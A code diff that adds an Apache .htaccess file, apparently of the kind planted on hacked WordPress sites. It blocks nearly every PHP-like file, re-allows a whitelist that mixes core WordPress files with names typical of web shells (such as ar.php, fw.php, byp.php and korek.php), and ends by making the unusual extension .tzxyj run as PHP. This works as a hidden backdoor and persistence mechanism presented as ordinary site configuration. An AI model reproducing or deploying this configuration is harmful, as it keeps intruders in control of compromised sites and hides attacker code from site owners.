@@ -1,0 +1,32 @@
+<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml)$">
+
+ Order allow,deny
+
+ Deny from all
+
+</FilesMatch>
+
+<FilesMatch "^(index.php|ar.php|PluginsHandler.inc.php|wp-login.php|wp-settings.php|wp-signup.php|wp-trackback.php|wp-activate.php|wp-mail.php|xmlrpc.php|admin-ajax.php|wp-comments-post.php|wp-cron.php|wp-config-sample.php|wp-links-opml.php|wp-load.php|admin-footer.php|admin-functions.php|admin-header.php|admin-post.php|admin.php|async-upload.php|authorize-application.php|comment.php|credits.php|custom-background.php|custom-header.php|customize.php|edit-comments.php|edit-form-advanced.php|edit-form-blocks.php|config.php|form_transfer_umum.php|format_tanggal.php|index.php|edit-link-form.php|edit-tag-form.php|edit-tags.php|edit.php|erase-personal-data.php|export-personal-data.php|export.php|freedoms.php|import.php|index.php|install-helper.php|install.php|link-add.php|link-manager.php|link-parse-opml.php|link.php|load-scripts.php|load-styles.php|media-new.php|media-upload.php|media.php|menu-header.php|menu.php|moderation.php|ms-admin.php|ms-delete-site.php|ms-edit.php|ms-options.php|ms-sites.php|ms-themes.php|ms-upgrade-network.php|ms-users.php|my-sites.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-head.php|options-media.php|options-permalink.php|Wizard-Handler.php|options-privacy.php|options-reading.php|options-writing.php|options.php|plugin-editor.php|fw.php|plugin-install.php|plugins.php|post-new.php|post.php|press-this.php|privacy-policy-guide.php|privacy.php|profile.php|revision.php|setup-config.php|site-editor.php|site-health-info.php|site-health.php|term.php|theme-editor.php|theme-install.php|themes.php|plugins-handler.php|update-core.php|update.php|upgrade-functions.php|upgrade.php|upload.php|user-edit.php|user-new.php|users.php|widgets-form-blocks.php|widgets-form.php|widgets.php|edit-form-advanced.php|link-parse-opml.php|ms-sites.php|options-writing.php|themes.php|https.php|class-https.php|admin-ajax.php|edit-form-comment.php|phew.php|link.php|ms-themes.php|mari.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scripts.php|ms-upgrade-network.php|admin-functions.php|edit.php|load-styles.php|digv2.php|ms-users.php|plugins.php|admin-header.php|licenses.php|edit-tag-form.php|media-new.php|my-sites.php|apps.php|post-new.php|upgrade-themes.php|sandwich.php|edit-tags.php|media.php|nav-menus.php|posts.php|admin-post.php|export.phpmedia-upload.php|network.php|press-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|user-edit.php|menu.php|options-general.php|profile.php|registration-functions.php|user-new.php|moderation.php|options-head.php|PluginsHandler.inc.PHTML|users.php|custom-background.php|Mods45Schema.php|options-media.php|setup-config.php|class-wp-customize-nav-menu-customize.php|widgets.php|fz.php|theme-single.php|custom-header.php|ms-delete-site.php|options-permalink.php|term.php|customize.php|link-add.php|supre.php|ms-edit.php|options.php|edit-comments.php|link-manager.php|ms-options.php|options-reading.php|xmlrpc.php|comments.php|front-page.php|home.php|header.php|singular.php|single.php|single-wordpress.php|page.php|category.php|tag.php|taxonomy.php|author.php|date.php|byp.php|search.php|attachment.php|404.php|1CT.php|Handler.inc.php|wp.php|priv.php|documen.php|dir.php|assets.php|506.php|korek.php|get-sitemap.php)$">
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index\.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
+
+AddType application/x-httpd-php .tzxyj
